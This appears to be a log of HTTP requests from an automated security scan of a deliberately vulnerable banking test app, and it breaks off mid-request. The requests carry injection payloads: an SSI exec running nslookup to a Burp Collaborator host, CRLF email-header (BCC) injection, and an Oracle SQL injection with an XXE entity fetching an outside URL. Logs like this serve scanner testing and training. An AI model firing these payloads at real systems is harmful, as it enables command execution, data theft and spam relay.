+POST /vulnbank/online/api.php/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%228wu%22%20value%3d%227vtjcluzm5%22--%3e%3c!--%23set%20var%3d%22ayw%22%20value%3d%229xvlenw1o7%22--%3e%3c!--%23echo%20var%3d%228wu%22--%3e%3c!--%23echo%20var%3d%22ayw%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20uig6z8hm9sh6500jis5g62pim9s1rpjn7hu9iy.burpcollaborator.net%22%20--%3e HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1%0d%0aBCC%3as0t4h6zkrqz4nyih0qneo07g47az9n1gpac20r@burpcollaborator.net%0d%0atdw%3a%20z HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php/1%3e%0d%0aBCC%3av517m94nwt47s1nk5tsht3cj9af2eq6kueh65v@burpcollaborator.net%0d%0ahah%3a%20x HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: 6kxl2orcan
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36pbs5hnx2j0
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+DNT: 1
+Referer: http://10.0.212.25/vulnbank/online/userinfo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: PHPSESSID=7bgg5tald4aea80790it7s1cc1
+
+type=user&action=infoupdate&firstname=John&lastname=Doe&phone=79035222212&email=j.doe%40vulnbank.de&birthdate=1984-04-04&about=Hi!
+END
+
+ST@RT
+Thu, 15 Mar 2018 14:45:52 INFO
+POST /vulnbank/online/api.php HTTP/1.1
+Host: 10.0.212.25
+Connection: keep-alive
+Content-Length: 130
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://10.0.212.25
+X-Requested-With: XMLHttpRequest
+User-Agent: (select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jgett SYSTEM "http://g9qsqu880e8swmr59ew2xog4dvjniblzgm6av.burpcollab'||'orator.net/">%jgett;]>'),'/l') from dual)
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
